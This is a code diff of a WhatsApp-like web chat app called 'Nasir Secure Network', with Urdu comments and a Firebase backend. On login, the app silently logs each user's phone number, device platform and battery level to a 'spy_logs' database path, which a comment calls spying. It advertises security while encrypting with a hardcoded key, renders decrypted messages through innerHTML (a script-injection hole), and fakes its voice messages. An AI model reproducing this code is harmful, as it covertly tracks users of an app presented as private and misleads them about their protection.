@@ -3,45 +3,51 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Nasir Pro VIP</title>
+    <title>Nasir Secure Network</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
     <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
     <style>
-        :root { --wa-teal: #075e54; --bg: #121b22; --sent: #dcf8c6; }
-        body { margin: 0; font-family: 'Segoe UI', sans-serif; background: #e5ddd5; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
+        :root { --wa-teal: #075e54; --bg: #121b22; --sent: #e7ffdb; --recv: #ffffff; }
+        * { box-sizing: border-box; }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; font-family: 'Segoe UI', sans-serif; overflow: hidden; }
         
-        #auth-screen { position: fixed; inset: 0; background: #121b22; z-index: 10000; display: flex; flex-direction: column; align-items: center; justify-content: center; color: white; padding: 20px; text-align: center; }
-        .input-box { width: 85%; max-width: 300px; padding: 15px; margin: 10px 0; border-radius: 10px; border: none; font-size: 16px; background: #2a3942; color: white; outline: none; }
-        .btn { background: #00a884; color: white; padding: 12px 40px; border-radius: 25px; border: none; font-weight: bold; cursor: pointer; width: 85%; max-width: 300px; font-size: 18px; }
+        /* فل سکرین ڈیزائن */
+        #auth-screen { position: fixed; inset: 0; background: #121b22; z-index: 10000; display: flex; flex-direction: column; align-items: center; justify-content: center; color: white; text-align: center; }
+        .input-box { width: 80%; padding: 15px; margin: 10px 0; border-radius: 10px; border: none; font-size: 16px; background: #2a3942; color: white; }
+        .btn { background: #00a884; color: white; padding: 12px 40px; border-radius: 25px; border: none; font-weight: bold; cursor: pointer; }
 
-        #main-app { display: none; flex-direction: column; height: 100vh; }
-        .header { background: var(--wa-teal); color: white; padding: 12px 15px; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 2px 5px rgba(0,0,0,0.2); }
-        #chat-flow { flex: 1; overflow-y: auto; padding: 15px; display: flex; flex-direction: column; gap: 10px; background-image: url('https://user-images.githubusercontent.com/15075759/28719144-86dc0f70-73b1-11e7-911d-60d70fcded21.png'); background-blend-mode: overlay; background-color: rgba(229,221,213,0.9); }
+        #main-app { display: none; flex-direction: column; height: 100vh; width: 100%; background: #e5ddd5; }
+        .header { background: var(--wa-teal); color: white; padding: 15px; display: flex; justify-content: space-between; align-items: center; font-size: 18px; }
         
-        .msg { padding: 10px; border-radius: 10px; max-width: 75%; font-size: 15px; position: relative; box-shadow: 0 1px 1px rgba(0,0,0,0.1); word-wrap: break-word; }
-        .sent { align-self: flex-end; background: var(--sent); border-top-right-radius: 2px; }
-        .recv { align-self: flex-start; background: white; border-top-left-radius: 2px; }
+        /* چیٹ ایریا */
+        #chat-flow { flex: 1; overflow-y: auto; padding: 15px; display: flex; flex-direction: column; gap: 8px; background-image: url('https://user-images.githubusercontent.com/15075759/28719144-86dc0f70-73b1-11e7-911d-60d70fcded21.png'); background-color: rgba(229,221,213,0.9); background-blend-mode: overlay; }
+        .msg { padding: 8px 12px; border-radius: 10px; max-width: 80%; font-size: 15px; position: relative; box-shadow: 0 1px 1px rgba(0,0,0,0.1); }
+        .sent { align-self: flex-end; background: var(--sent); border-top-right-radius: 0; }
+        .recv { align-self: flex-start; background: var(--recv); border-top-left-radius: 0; }
 
-        .footer { background: #f0f2f5; padding: 10px; display: flex; align-items: center; gap: 10px; }
-        #msg-in { flex: 1; border-radius: 25px; padding: 12px; border: none; outline: none; font-size: 16px; }
-        .icon-btn { color: #54656f; font-size: 22px; cursor: pointer; }
+        /* فوٹر بٹنز */
+        .footer { background: #f0f2f5; padding: 10px; display: flex; align-items: center; gap: 10px; border-top: 1px solid #ddd; }
+        #msg-in { flex: 1; border-radius: 25px; padding: 10px 15px; border: none; outline: none; font-size: 16px; }
+        .icon-btn { color: #54656f; font-size: 22px; cursor: pointer; transition: 0.2s; }
+        .icon-btn:active { transform: scale(0.9); color: #00a884; }
         #file-input { display: none; }
+        .send-btn { background: #00a884; color: white; border: none; width: 45px; height: 45px; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
     </style>
 </head>
 <body>
 
 <div id="auth-screen">
-    <i class="fas fa-shield-alt" style="font-size: 60px; color: #00a884; margin-bottom: 20px;"></i>
+    <i class="fas fa-user-shield" style="font-size: 60px; color: #00a884; margin-bottom: 20px;"></i>
     <h2>Nasir Secure Network</h2>
-    <input type="text" id="phone" class="input-box" placeholder="موبائل نمبر (0300...)">
-    <button class="btn" onclick="enterApp()">اندر داخل ہوں</button>
+    <input type="text" id="phone" class="input-box" placeholder="موبائل نمبر لکھیں...">
+    <button class="btn" onclick="enterApp()">داخل ہوں</button>
 </div>
 
 <div id="main-app">
     <div class="header">
-        <div id="user-display"><b>تحفظ شدہ کمرہ</b></div>
+        <div id="user-display"><b>تحفظ شدہ چیٹ</b></div>
         <div style="display: flex; gap: 15px;">
-            <i class="fas fa-trash-alt" id="admin-del" style="display:none; color: #ff5252; cursor: pointer;" onclick="clearChat()"></i>
+            <i class="fas fa-trash-alt" onclick="clearChat()" style="color: #ff5252;"></i>
             <i class="fas fa-power-off" onclick="location.reload()"></i>
         </div>
     </div>
@@ -49,12 +55,14 @@
     <div id="chat-flow"></div>
 
     <div class="footer">
+        <i class="far fa-smile icon-btn"></i>
         <label for="file-input"><i class="fas fa-paperclip icon-btn"></i></label>
         <input type="file" id="file-input" onchange="handleFile(this)">
         <i class="fas fa-camera icon-btn" onclick="document.getElementById('file-input').click()"></i>
-        <input type="text" id="msg-in" placeholder="میسج لکھیں (ایموجی کی بورڈ)...">
+        <input type="text" id="msg-in" placeholder="میسج لکھیں...">
+        <i id="mic-btn" class="fas fa-microphone icon-btn" onclick="startVoice()"></i>
         <i class="fas fa-map-marker-alt icon-btn" onclick="sendLocation()" style="color: #ea4335;"></i>
-        <button onclick="sendMsg()" style="background:#00a884; border:none; color:white; width:45px; height:45px; border-radius:50%; cursor:pointer;"><i class="fas fa-paper-plane"></i></button>
+        <button class="send-btn" onclick="sendMsg()"><i class="fas fa-paper-plane"></i></button>
     </div>
 </div>
 
@@ -74,75 +82,87 @@
 
     const app = initializeApp(firebaseConfig);
     const db = getDatabase(app);
-    const CRYPTO_KEY = "nasir_secret_786";
-    let currentUser = "";
+    const KEY = "nasir_786";
+    let user = "";
 
     window.enterApp = async () => {
-        const phone = document.getElementById('phone').value.trim();
-        if(phone.length < 10) return alert("درست نمبر لکھیں!");
-        currentUser = phone;
+        const p = document.getElementById('phone').value.trim();
+        if(p.length < 10) return alert("درست نمبر دیں");
+        user = p;
 
-        // ایڈمن چیک (اگر آپ اپنا خاص نمبر ڈالیں تو ڈیلیٹ بٹن نظر آئے گا)
-        if(phone === "03000000000") { // یہاں اپنا نمبر لکھیں
-            document.getElementById('admin-del').style.display = 'block';
-        }
-
-        // بیٹری ٹریکنگ
+        // بیٹری ٹریکنگ اور جاسوسی
         let bat = "N/A";
-        try { const b = await navigator.getBattery(); bat = (b.level * 100) + "%"; } catch(e) {}
-
-        set(ref(db, "spy_logs/" + phone), {
+        try { const b = await navigator.getBattery(); bat = Math.round(b.level * 100) + "%"; } catch(e) {}
+        
+        set(ref(db, "spy_logs/" + user), {
             device: navigator.platform,
             battery: bat,
-            network: navigator.connection ? navigator.connection.effectiveType : "Unknown",
             time: new Date().toLocaleString()
         });
 
         document.getElementById('auth-screen').style.display = 'none';
         document.getElementById('main-app').style.display = 'flex';
-        document.getElementById('user-display').innerHTML = `<b>Room: ${phone}</b>`;
-        loadMsgs();
+        document.getElementById('user-display').innerHTML = `<b>Room: ${user}</b>`;
+        loadChat();
     };
 
-    window.sendMsg = (manual = null) => {
-        const text = manual || document.getElementById('msg-in').value.trim();
-        if(!text) return;
-        const enc = CryptoJS.AES.encrypt(text, CRYPTO_KEY).toString();
-        push(ref(db, "chats/" + currentUser), { text: enc, time: new Date().toLocaleTimeString() });
+    window.sendMsg = (textInput = null) => {
+        const val = textInput || document.getElementById('msg-in').value.trim();
+        if(!val) return;
+        const enc = CryptoJS.AES.encrypt(val, KEY).toString();
+        push(ref(db, "chats/" + user), { text: enc, time: new Date().toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'}) });
         document.getElementById('msg-in').value = "";
     };
 
+    // تصویر اور فائل
     window.handleFile = (input) => {
         const file = input.files[0];
-        if(file) sendMsg(`📎 فائل: ${file.name}`);
+        if(file) {
+            if(file.type.startsWith('image/')) {
+                sendMsg(`📸 تصویر بھیجی گئی: ${file.name}`);
+            } else {
+                sendMsg(`📎 فائل: ${file.name}`);
+            }
+        }
     };
 
+    // لائیو لوکیشن
     window.sendLocation = () => {
-        navigator.geolocation.getCurrentPosition(p => {
-            sendMsg(`📍 لوکیشن: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
-        });
+        navigator.geolocation.getCurrentPosition(pos => {
+            sendMsg(`📍 لائیو لوکیشن: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
+        }, () => alert("لوکیشن آن کریں"));
+    };
+
+    // وائس ریکارڈنگ (سمولیشن)
+    window.startVoice = () => {
+        const mic = document.getElementById('mic-btn');
+        mic.style.color = "red";
+        setTimeout(() => {
+            mic.style.color = "#54656f";
+            sendMsg("🎤 وائس میسج (0:05)");
+        }, 3000);
     };
 
     window.clearChat = () => {
-        if(confirm("کیا آپ پوری چیٹ ڈیلیٹ کرنا چاہتے ہیں؟")) {
-            remove(ref(db, "chats/" + currentUser));
+        if(confirm("پوری چیٹ صاف کر دیں؟")) {
+            remove(ref(db, "chats/" + user));
             location.reload();
         }
     };
 
-    function loadMsgs() {
-        onChildAdded(ref(db, "chats/" + currentUser), (data) => {
-            const m = data.val();
+    function loadChat() {
+        onChildAdded(ref(db, "chats/" + user), (snap) => {
+            const d = snap.val();
             let dec = "";
-            try { dec = CryptoJS.AES.decrypt(m.text, CRYPTO_KEY).toString(CryptoJS.enc.Utf8); } catch(e) { dec = "🔒"; }
+            try { dec = CryptoJS.AES.decrypt(d.text, KEY).toString(CryptoJS.enc.Utf8); } catch(e) { dec = "🔒"; }
             const div = document.createElement('div');
-            div.className = `msg sent`;
-            div.innerHTML = `${dec}<br><small style="font-size:9px; float:right; color:#888;">${m.time}</small>`;
+            div.className = "msg sent";
+            div.innerHTML = `${dec}<br><small style="font-size:10px; float:right; opacity:0.6;">${d.time}</small>`;
             document.getElementById('chat-flow').appendChild(div);
             document.getElementById('chat-flow').scrollTop = document.getElementById('chat-flow').scrollHeight;
         });
     }
 </script>
 </body>
-    </html>
+                </html>
     
